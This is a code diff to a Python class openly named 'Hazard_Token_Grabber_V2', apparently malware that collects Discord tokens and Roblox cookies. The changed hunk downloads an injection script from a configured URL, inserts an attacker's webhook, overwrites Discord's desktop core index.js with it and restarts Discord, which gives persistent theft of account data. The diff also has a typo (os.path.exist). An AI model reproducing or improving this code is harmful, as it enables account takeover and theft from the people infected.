@@ -89,8 +89,7 @@ class Hazard_Token_Grabber_V2(functions):
         self.tokens = []
         self.robloxcookies = []
 
-    @staticmethod
-    def try_extract(func):
+    def try_extract(self, func):
         def wrapper(*args, **kwargs):
             try:
                 func(*args, **kwargs)
@@ -172,12 +171,13 @@ class Hazard_Token_Grabber_V2(functions):
                 for __dir in os.listdir(os.path.abspath(discord)):
                     if match(r'app-(\d*\.\d*)*', __dir):
                         app = os.path.abspath(disc_sep+__dir)
-
-                        f = httpx.get(self.config('injection_url')).text.replace(
-                            "%WEBHOOK%", self.webhook)
-                        with open(app+'\\modules\\discord_desktop_core-2\\discord_desktop_core\\index.js', 'w', errors="ignore") as indexFile:
-                            indexFile.write(f)
-                        os.startfile(disc_sep+'Update.exe')
+                        inj_path = app+'\\modules\\discord_desktop_core-2\\discord_desktop_core\\index.js'
+                        if os.path.exist(inj_path):
+                            f = httpx.get(self.config('injection_url')).text.replace(
+                                "%WEBHOOK%", self.webhook)
+                            with open(inj_path, 'w', errors="ignore") as indexFile:
+                                indexFile.write(f)
+                            os.startfile(disc_sep+'Update.exe')
 
     def killDiscord(self):
         for proc in psutil.process_iter():
